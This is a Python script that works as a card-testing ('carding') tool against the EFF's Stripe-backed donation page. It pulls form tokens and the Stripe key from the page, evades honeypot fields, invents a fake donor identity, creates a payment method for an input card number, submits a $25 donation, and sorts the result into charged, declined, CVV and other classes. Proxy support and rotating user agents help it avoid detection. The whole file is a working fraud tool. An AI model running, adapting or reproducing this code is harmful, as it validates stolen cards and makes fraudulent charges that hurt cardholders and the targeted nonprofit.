"""
EFF (Electronic Frontier Foundation) Stripe Checker
Gateway: Stripe via Springboard donation platform
Site: supporters.eff.org/donate/join-eff-4

Flow:
1. Load donation page → extract authenticity_token, spinner, Stripe PK
2. Create Stripe PaymentMethod via Stripe API (pk_live key)
3. Submit donation form with PM ID + billing details
4. Parse response for charge/decline
"""

import asyncio
import aiohttp
import random
import string
import re
import json
import time
from fake_useragent import UserAgent


class EFFResultClassifier:
    CHARGED_KEYWORDS = [
        'thank you', 'donation complete', 'receipt', 'confirmation',
        'successfully processed', 'payment successful', 'thank_you',
        'your donation', 'contribution received',
    ]

    DECLINED_KEYWORDS = [
        'card was declined', 'transaction declined', 'payment failed',
        'unable to process', 'do not honor', 'insufficient funds',
        'card declined', 'declined', 'not authorized', 'transaction not allowed',
        'pickup card', 'lost card', 'stolen card', 'expired card',
        'card_declined', 'generic_decline', 'fraudulent', 'processing_error',
        'your card was declined',
    ]

    CCN_KEYWORDS = [
        'incorrect_number', 'invalid card number', 'card number is invalid',
        'invalid_number', 'number is not a valid',
    ]

    CVV_KEYWORDS = [
        'incorrect_cvc', 'security code is incorrect', 'cvc is incorrect',
        'invalid cvc', 'invalid_cvc', 'incorrect cvv',
    ]

    EXPIRED_KEYWORDS = [
        'expired_card', 'card has expired', 'expiration date is invalid',
        'invalid_expiry', 'exp_month', 'exp_year',
    ]

    RISK_KEYWORDS = [
        'high risk', 'fraud', 'fraudulent', 'risk', 'blocked',
        'suspected fraud', 'stripe radar',
    ]

    THREEDS_KEYWORDS = [
        'requires_action', 'authentication_required', '3d secure',
        'requires_source_action', 'payment_intent_authentication',
    ]

    RATE_LIMIT_KEYWORDS = [
        'rate limit', 'too many requests', 'try again later',
    ]

    @staticmethod
    def classify(response_text, status_code=200, stripe_error=None, redirect_url=None):
        text = (response_text or '').lower().strip()

        if stripe_error:
            err_code = stripe_error.get('code', '')
            err_msg = stripe_error.get('message', '').lower()
            err_decline = stripe_error.get('decline_code', '')

            if err_code == 'incorrect_number' or 'invalid card number' in err_msg:
                return 'CCN', f'Invalid Card Number | {err_msg}'
            if err_code == 'incorrect_cvc' or 'cvc' in err_msg:
                return 'CVV', f'Incorrect CVV/CVC | {err_msg}'
            if err_code == 'expired_card' or 'expired' in err_msg:
                return 'EXPIRED', f'Card Expired | {err_msg}'
            if err_code == 'card_declined':
                return 'DECLINED', f'{err_decline or "Generic Decline"} | {err_msg}'
            if err_code == 'processing_error':
                return 'ERROR', f'Processing Error | {err_msg}'
            if 'rate_limit' in err_code or 'rate limit' in err_msg:
                return 'RATE_LIMIT', f'Rate Limited | {err_msg}'
            if err_code == 'authentication_required' or 'authentication' in err_msg:
                return '3DS', f'3D Secure Required | {err_msg}'
            if 'test card' in err_msg or 'test mode' in err_msg:
                return 'ERROR', f'Test card rejected | {err_msg}'
            return 'DECLINED', f'{err_code or "error"} | {err_msg}'

        if redirect_url:
            redir_lower = redirect_url.lower()
            if 'thank' in redir_lower or 'confirmation' in redir_lower or 'receipt' in redir_lower:
                return 'CHARGED', f'Payment Accepted (redirect to thank-you)'

        if status_code and status_code >= 500:
            return 'ERROR', f'Server error {status_code}'

        for kw in EFFResultClassifier.CCN_KEYWORDS:
            if kw in text:
                return 'CCN', f'Invalid Card Number | {text[:80]}'
        for kw in EFFResultClassifier.CVV_KEYWORDS:
            if kw in text:
                return 'CVV', f'Incorrect CVV | {text[:80]}'
        for kw in EFFResultClassifier.EXPIRED_KEYWORDS:
            if kw in text:
                return 'EXPIRED', f'Card Expired | {text[:80]}'
        for kw in EFFResultClassifier.THREEDS_KEYWORDS:
            if kw in text:
                return '3DS', f'3D Secure Required | {text[:80]}'
        for kw in EFFResultClassifier.RISK_KEYWORDS:
            if kw in text:
                return 'RISK', f'Flagged High Risk | {text[:80]}'
        for kw in EFFResultClassifier.RATE_LIMIT_KEYWORDS:
            if kw in text:
                return 'RATE_LIMIT', f'Rate Limited | {text[:80]}'
        for kw in EFFResultClassifier.CHARGED_KEYWORDS:
            if kw in text:
                return 'CHARGED', f'Payment Accepted | {text[:80]}'
        for kw in EFFResultClassifier.DECLINED_KEYWORDS:
            if kw in text:
                return 'DECLINED', f'{text[:100]}'

        return 'UNKNOWN', f'Unclassified response | {text[:100]}'


US_STATES = {
    'New York': '1042', 'California': '1005', 'Illinois': '1014',
    'Texas': '1044', 'Arizona': '1004', 'Pennsylvania': '1039',
    'Florida': '1010', 'Ohio': '1036', 'North Carolina': '1034',
    'Indiana': '1015', 'Colorado': '1006', 'Washington': '1048',
    'Tennessee': '1043', 'Oregon': '1038', 'Georgia': '1011',
    'Michigan': '1023', 'Virginia': '1047', 'Massachusetts': '1022',
    'Maryland': '1021', 'Minnesota': '1024', 'New Jersey': '1031',
    'Wisconsin': '1050', 'Missouri': '1026', 'Connecticut': '1007',
}


class EFFChecker:
    SITE_NAME = "EFF"
    DONATE_URL = "https://supporters.eff.org/donate/join-eff-4"
    STRIPE_PK = "pk_live_1SWAZ2B8lZUDeNlczGBOVCabICVxBJtuj1L9m9Kk6NoRASygPPjIC7UJZ2Tv1tvzubjMW74IG8jjiFiAYVOicgBw100ssqcVxco"

    def __init__(self):
        self.ua = UserAgent(browsers=['chrome'], os=['windows'], platforms=['pc'])

    def _random_email(self):
        user = ''.join(random.choices(string.ascii_lowercase, k=8))
        num = random.randint(10, 99)
        domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'protonmail.com']
        return f"{user}{num}@{random.choice(domains)}"

    def _random_name(self):
        first_names = [
            'James', 'John', 'Robert', 'Michael', 'William', 'David', 'Richard',
            'Joseph', 'Thomas', 'Christopher', 'Daniel', 'Matthew', 'Anthony',
            'Mark', 'Steven', 'Paul', 'Andrew', 'Joshua', 'Kenneth', 'Kevin',
            'Brian', 'George', 'Timothy', 'Ronald', 'Edward', 'Jason', 'Jeffrey',
        ]
        last_names = [
            'Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller',
            'Davis', 'Rodriguez', 'Martinez', 'Hernandez', 'Lopez', 'Gonzalez',
            'Wilson', 'Anderson', 'Thomas', 'Taylor', 'Moore', 'Jackson', 'Martin',
        ]
        return random.choice(first_names), random.choice(last_names)

    def _random_address(self):
        streets = [
            '123 Main St', '456 Oak Ave', '789 Pine Rd', '321 Elm St',
            '654 Maple Dr', '987 Cedar Ln', '147 Birch Way', '258 Walnut Ct',
        ]
        cities = [
            ('New York', 'New York', '10001'),
            ('Los Angeles', 'California', '90001'),
            ('Chicago', 'Illinois', '60601'),
            ('Houston', 'Texas', '77001'),
            ('Phoenix', 'Arizona', '85001'),
            ('Philadelphia', 'Pennsylvania', '19101'),
            ('San Diego', 'California', '92101'),
            ('Dallas', 'Texas', '75201'),
            ('Austin', 'Texas', '73301'),
            ('Seattle', 'Washington', '98101'),
            ('Denver', 'Colorado', '80201'),
            ('Portland', 'Oregon', '97201'),
            ('Atlanta', 'Georgia', '30301'),
            ('Miami', 'Florida', '33101'),
        ]
        street = random.choice(streets)
        city, state, zipcode = random.choice(cities)
        state_id = US_STATES.get(state, '1042')
        return street, city, state, state_id, zipcode

    def _get_headers(self, referer=None):
        return {
            'User-Agent': self.ua.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Referer': referer or 'https://www.eff.org/',
        }

    async def check_card(self, cc, mes, ano, cvv=None, proxy=None, skip_cvv=False):
        masked = f"{cc[:6]}******{cc[-4:]}" if len(cc) > 10 else f"***{cc[-4:]}"
        card_display = f"{masked}|{mes}|{ano}|***"
        mode = " [NO-CVV]" if skip_cvv else ""
        print(f"[{self.SITE_NAME}]{mode} Checking: {card_display}", flush=True)

        connector = None
        if proxy:
            try:
                from aiohttp_socks import ProxyConnector
                connector = ProxyConnector.from_url(proxy)
            except Exception as e:
                print(f"[{self.SITE_NAME}] Proxy error: {e}", flush=True)

        timeout = aiohttp.ClientTimeout(total=60)
        jar = aiohttp.CookieJar(unsafe=True)

        try:
            async with aiohttp.ClientSession(
                timeout=timeout,
                cookie_jar=jar,
                connector=connector,
                headers=self._get_headers()
            ) as session:

                print(f"[{self.SITE_NAME}] Loading donation page...", flush=True)
                async with session.get(self.DONATE_URL, allow_redirects=True) as resp:
                    if resp.status >= 500:
                        return 'ERROR', 'EFF site under maintenance'
                    html = await resp.text()

                auth_match = re.search(r'name="authenticity_token"[^>]*value="([^"]+)"', html)
                if not auth_match:
                    auth_match = re.search(r'authenticity_token["\s]*[=:]["\s]*["\']([^"\']+)', html)
                if not auth_match:
                    return 'ERROR', 'authenticity_token not found'
                auth_token = auth_match.group(1)

                spinner_match = re.search(r'name="spinner"[^>]*value="([^"]+)"', html)
                spinner = spinner_match.group(1) if spinner_match else ''

                pk_match = re.search(r'(pk_live_[A-Za-z0-9_]+)', html)
                stripe_pk = pk_match.group(1) if pk_match else self.STRIPE_PK

                honeypot_match = re.search(
                    r'<div[^>]*style="[^"]*display:\s*none[^"]*"[^>]*>.*?<input[^>]*name="([^"]+)"[^>]*>.*?</div>',
                    html, re.DOTALL
                )
                honeypot_fields = {}
                if honeypot_match:
                    hp_section = honeypot_match.group(0)
                    hp_inputs = re.findall(r'name="([^"]+)"', hp_section)
                    for hp in hp_inputs:
                        honeypot_fields[hp] = ''

                print(f"[{self.SITE_NAME}] Got auth token + Stripe PK", flush=True)

                print(f"[{self.SITE_NAME}] Creating Stripe PaymentMethod...", flush=True)

                exp_month = mes.lstrip('0') if mes else mes
                exp_year = ano
                if len(exp_year) == 2:
                    exp_year = f"20{exp_year}"

                first_name, last_name = self._random_name()
                email = self._random_email()
                street, city, state_name, state_id, zipcode = self._random_address()

                stripe_data = {
                    'type': 'card',
                    'card[number]': cc,
                    'card[exp_month]': exp_month,
                    'card[exp_year]': exp_year,
                    'billing_details[name]': f'{first_name} {last_name}',
                    'billing_details[email]': email,
                    'billing_details[address][postal_code]': zipcode,
                    'billing_details[address][country]': 'US',
                    'billing_details[address][city]': city,
                    'billing_details[address][state]': state_name,
                    'billing_details[address][line1]': street,
                }
                if cvv and not skip_cvv:
                    stripe_data['card[cvc]'] = cvv
                    print(f"[{self.SITE_NAME}] CVV included in Stripe request", flush=True)
                else:
                    print(f"[{self.SITE_NAME}] CVV intercepted - stripped", flush=True)

                async with session.post(
                    'https://api.stripe.com/v1/payment_methods',
                    data=stripe_data,
                    headers={
                        'Authorization': f'Bearer {stripe_pk}',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'User-Agent': self.ua.random,
                    }
                ) as resp:
                    stripe_resp = await resp.json()

                if 'error' in stripe_resp:
                    err = stripe_resp['error']
                    result_type, result_msg = EFFResultClassifier.classify(
                        '', stripe_error=err
                    )
                    print(f"[{self.SITE_NAME}] Stripe error: {err.get('message', '')}", flush=True)
                    return result_type, f"{result_msg} | ...{cc[-4:]}"

                pm_id = stripe_resp.get('id', '')
                card_data = stripe_resp.get('card', {})
                brand = card_data.get('brand', '?').upper()
                funding = card_data.get('funding', '?')
                country = card_data.get('country', '?')
                last4 = card_data.get('last4', cc[-4:])

                bin_line = f"{brand} {funding} {country} ...{last4}"
                print(f"[{self.SITE_NAME}] PM created: {pm_id[:25]}... | {bin_line}", flush=True)

                print(f"[{self.SITE_NAME}] Submitting donation form...", flush=True)

                form_data = {
                    'authenticity_token': auth_token,
                    'spinner': spinner,
                    'donation[frequency]': 'once',
                    'donation[membership_level]': 'level25',
                    'donation[amount]': '25',
                    'donation[payment_processor]': 'stripe',
                    'donation[cover_fees]': '0',
                    'donation[create_membership]': '1',
                    'donation[premium_option]': '',
                    'stripe_donation[stripe_payment_method]': pm_id,
                    'stripe_donation[subscribe]': '0',
                    'stripe_donation[billing_email]': email,
                    'stripe_donation[billing_first_name]': first_name,
                    'stripe_donation[billing_last_name]': last_name,
                    'stripe_donation[billing_street_address]': street,
                    'stripe_donation[billing_city]': city,
                    'stripe_donation[billing_country_id]': '1228',
                    'stripe_donation[billing_state_province_id]': state_id,
                    'stripe_donation[billing_postal_code]': zipcode,
                    'shipping_same_as_billing': '1',
                    'stripe_donation[shipping_street_address]': street,
                    'stripe_donation[shipping_city]': city,
                    'stripe_donation[shipping_country_id]': '1228',
                    'stripe_donation[shipping_state_province_id]': state_id,
                    'stripe_donation[shipping_postal_code]': zipcode,
                    'paypal_donation[subscribe]': '0',
                }

                for hp_name, hp_val in honeypot_fields.items():
                    form_data[hp_name] = hp_val

                async with session.post(
                    self.DONATE_URL,
                    data=form_data,
                    allow_redirects=False,
                    headers={
                        'User-Agent': self.ua.random,
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Origin': 'https://supporters.eff.org',
                        'Referer': self.DONATE_URL,
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.9',
                    }
                ) as resp:
                    resp_status = resp.status
                    resp_headers = dict(resp.headers)
                    resp_body = await resp.text()

                print(f"[{self.SITE_NAME}] Form response: {resp_status}", flush=True)

                redirect_url = resp_headers.get('Location', '')

                if resp_status in (301, 302, 303, 307, 308):
                    print(f"[{self.SITE_NAME}] Redirect to: {redirect_url}", flush=True)

                    if redirect_url:
                        if not redirect_url.startswith('http'):
                            redirect_url = f"https://supporters.eff.org{redirect_url}"
                        async with session.get(redirect_url, allow_redirects=True) as rresp:
                            resp_body = await rresp.text()
                            resp_status = rresp.status
                            redirect_url = str(rresp.url)

                result_type, result_msg = EFFResultClassifier.classify(
                    resp_body, resp_status, redirect_url=redirect_url
                )

                errors_in_page = re.findall(
                    r'class="[^"]*(?:error|alert|flash)[^"]*"[^>]*>([^<]+)', resp_body, re.I
                )
                if errors_in_page:
                    error_text = '; '.join(e.strip() for e in errors_in_page[:3])
                    print(f"[{self.SITE_NAME}] Page errors: {error_text}", flush=True)
                    if result_type == 'UNKNOWN':
                        for kw in EFFResultClassifier.DECLINED_KEYWORDS:
                            if kw in error_text.lower():
                                result_type = 'DECLINED'
                                result_msg = f'{error_text[:80]}'
                                break

                stripe_errors = re.findall(r'stripe[_\-]?(?:error|message)[^<]{0,200}', resp_body, re.I)
                if stripe_errors:
                    for se in stripe_errors:
                        print(f"[{self.SITE_NAME}] Stripe page error: {se[:100]}", flush=True)

                return result_type, f'{result_msg} | {bin_line}'

        except asyncio.TimeoutError:
            return 'ERROR', 'Request timed out'
        except aiohttp.ClientError as e:
            return 'ERROR', f'Connection error: {str(e)[:60]}'
        except Exception as e:
            print(f"[{self.SITE_NAME}] Exception: {e}", flush=True)
            return 'ERROR', f'Exception: {str(e)[:60]}'


if __name__ == '__main__':
    import sys

    async def main():
        if len(sys.argv) < 2:
            print("Usage: python eff_checker.py CC|MM|YY|CVV")
            return

        card_input = sys.argv[1]
        parts = card_input.split('|')
        if len(parts) != 4:
            print("Invalid format. Use: CC|MM|YY|CVV")
            return

        cc, mm, yy, cvv = parts

        checker = EFFChecker()
        result_type, result_msg = await checker.check_card(cc, mm, yy, cvv)
        print(f"\n{'='*60}")
        print(f"Result: {result_type}")
        print(f"Details: {result_msg}")

    asyncio.run(main())
